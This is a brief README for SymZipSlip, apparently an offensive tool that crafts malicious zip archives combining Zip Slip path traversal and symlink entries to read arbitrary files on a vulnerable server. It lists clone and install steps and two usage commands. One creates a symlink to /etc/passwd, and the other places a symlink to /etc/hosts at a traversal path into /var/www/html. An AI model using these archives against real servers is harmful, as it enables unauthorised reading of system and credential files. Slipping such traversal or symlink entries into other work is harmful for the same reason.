# SymZipSlip
## Introduction
SymZip allows to combine two vulnerabilities a Zip Slip and Zip Symlink in order to have an Aritrary file read on a vulnerable server.
## Installation
- `git clone https://github.com/spawnzii/SymZipSlip.git`
- `cd SymZipSlip ; pip install -r requirements.txt`
## Usage
- You can simply run `python3 symzip.py` to create an evil zip that makes a symbolic link between /etc/passwd and etc. (No Zip Slip here, the file will be extracted on the current directory.)
- You can exploit Zip Slip with symlink by running the following command `python3 symzip.py -s /etc/hosts -n ../../../../../../var/www/html/poc -o spz.zip`.
